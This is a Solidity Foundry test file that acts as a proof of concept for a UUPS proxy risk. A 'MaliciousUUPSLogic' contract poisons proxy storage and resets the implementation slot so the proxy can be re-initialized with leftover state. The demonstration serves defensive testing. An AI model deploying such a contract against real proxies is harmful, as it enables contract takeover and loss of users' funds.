// SPDX-License-Identifier: AGPLv3
pragma solidity ^0.8.23;

import { Test } from "forge-std/Test.sol";

import { UUPSProxy } from "../../../contracts/upgradability/UUPSProxy.sol";
import { UUPSUtils } from "../../../contracts/upgradability/UUPSUtils.sol";
import { UUPSProxiableMock } from "../../../contracts/mocks/UUPSProxiableMock.t.sol";

/// @dev Minimal malicious logic used to poison proxy storage and reset the impl slot.
contract MaliciousUUPSLogic {
    uint256 public poisonMark;

    function poison(uint256 value) external {
        poisonMark = value;
    }

    function resetImplementationSlot() external {
        UUPSUtils.setImplementation(address(0));
    }
}

/// @dev PoC referenced by warnProductionUUPSProxyInitRisk() in ops-scripts/libs/common.js.
contract UUPSProxyResetTest is Test {
    bytes32 internal constant IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function _implementation(address proxy) internal view returns (address) {
        return address(uint160(uint256(vm.load(proxy, IMPLEMENTATION_SLOT))));
    }

    function testImplSlotResetAllowsReinitialize() public {
        UUPSProxy proxy = new UUPSProxy();
        MaliciousUUPSLogic malicious = new MaliciousUUPSLogic();
        UUPSProxiableMock legit = new UUPSProxiableMock(keccak256("UUPSProxiableMock1"), 42);

        assertEq(_implementation(address(proxy)), address(0));

        proxy.initializeProxy(address(malicious));
        MaliciousUUPSLogic proxiedMalicious = MaliciousUUPSLogic(address(proxy));

        proxiedMalicious.poison(1337);
        proxiedMalicious.resetImplementationSlot();
        assertEq(_implementation(address(proxy)), address(0));

        proxy.initializeProxy(address(legit));
        assertEq(_implementation(address(proxy)), address(legit));
        assertEq(UUPSProxiableMock(address(proxy)).waterMark(), 42);
        // Delegatecall storage from the malicious phase persists after re-init.
        assertEq(vm.load(address(proxy), bytes32(uint256(0))), bytes32(uint256(1337)));
    }
}
